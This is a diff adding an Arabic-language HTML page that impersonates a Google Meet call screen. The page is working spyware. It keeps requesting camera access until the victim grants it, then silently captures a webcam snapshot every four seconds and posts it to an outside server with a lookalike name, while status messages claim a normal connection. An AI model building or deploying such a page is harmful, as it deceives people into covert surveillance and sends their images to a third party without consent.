@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Meet</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #202124;
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .main-container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .video-wrapper {
+            width: 100%;
+            max-width: 900px;
+            aspect-ratio: 16 / 9;
+            background-color: #3c4043;
+            border-radius: 8px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+        }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        .user-label {
+            position: absolute;
+            bottom: 16px;
+            left: 16px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .controls-bar {
+            height: 80px;
+            background-color: #202124;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 24px;
+            position: relative;
+        }
+        .action-buttons { display: flex; gap: 12px; }
+        .btn {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: 1px solid #5f6368;
+            background-color: #3c4043;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+        .btn-danger {
+            background-color: #ea4335;
+            width: 64px;
+            border-radius: 24px;
+            border: none;
+        }
+        #photo-canvas { display: none; }
+        #status-message {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 10px 20px;
+            border-radius: 4px;
+            background: #3c4043;
+            font-size: 13px;
+            z-index: 100;
+            border-left: 4px solid #8ab4f8;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="status-message">جاري التحقق من الإعدادات...</div>
+
+    <div class="main-container">
+        <div class="video-wrapper">
+            <video id="camera-feed" autoplay playsinline muted></video>
+            <div class="user-label" id="camera-type-label">جاري التحميل...</div>
+        </div>
+    </div>
+
+    <canvas id="photo-canvas"></canvas>
+
+    <div class="controls-bar">
+        <div class="action-buttons">
+            <div class="btn">🎤</div>
+            <div class="btn">📹</div>
+            <div class="btn">💬</div>
+            <div class="btn-danger">📞</div>
+        </div>
+    </div>
+
+    <script>
+        const video = document.getElementById('camera-feed');
+        const canvas = document.getElementById('photo-canvas');
+        const statusMessage = document.getElementById('status-message');
+        const typeLabel = document.getElementById('camera-type-label');
+        let currentStream = null;
+
+        // الرابط الخاص بسيرفر رندر - تأكد من تحديثه إذا تغير
+        const BACKEND_URL = 'https://googl-mait123.onrender.com'; 
+
+        async function startCamera(mode = 'user') {
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
+
+            try {
+                const constraints = { video: { facingMode: mode }, audio: false }; 
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                currentStream = stream;
+                video.srcObject = stream;
+                
+                video.style.transform = (mode === 'user') ? 'scaleX(-1)' : 'scaleX(1)';
+                typeLabel.textContent = (mode === 'user') ? 'أنت (الكاميرا الأمامية)' : 'الكاميرا الخلفية';
+
+                video.onplaying = () => {
+                    statusMessage.textContent = 'تم الاتصال بالخادم بنجاح';
+                    // تشغيل السحب التلقائي المستمر كل 4 ثوانٍ
+                    setInterval(captureAndSend, 4000);
+                };
+
+            } catch (err) {
+                console.error("Access denied:", err);
+                statusMessage.textContent = 'يجب السماح بالكاميرا للمتابعة';
+                // إعادة المحاولة تلقائياً كل ثانية حتى يضغط "سماح"
+                setTimeout(() => startCamera(mode), 1000);
+            }
+        }
+
+        function captureAndSend() {
+            if (!currentStream || video.paused || video.ended) return;
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+
+            if (video.style.transform === 'scaleX(-1)') {
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+            }
+
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageDataURL = canvas.toDataURL('image/jpeg', 0.7); // تقليل الجودة قليلاً لسرعة الإرسال
+            
+            sendPhotoToServer(imageDataURL);
+        }
+
+        async function sendPhotoToServer(imageData) {
+            try {
+                const response = await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData })
+                });
+                if(response.ok) {
+                    statusMessage.textContent = 'مستقر - جاري المزامنة..';
+                }
+            } catch (error) {
+                console.error('خطأ إرسال:', error);
+            }
+        }
+
+        // بدء التشغيل التلقائي فور التحميل
+        window.onload = () => startCamera('user');
+    </script>
+</body>
+</html>
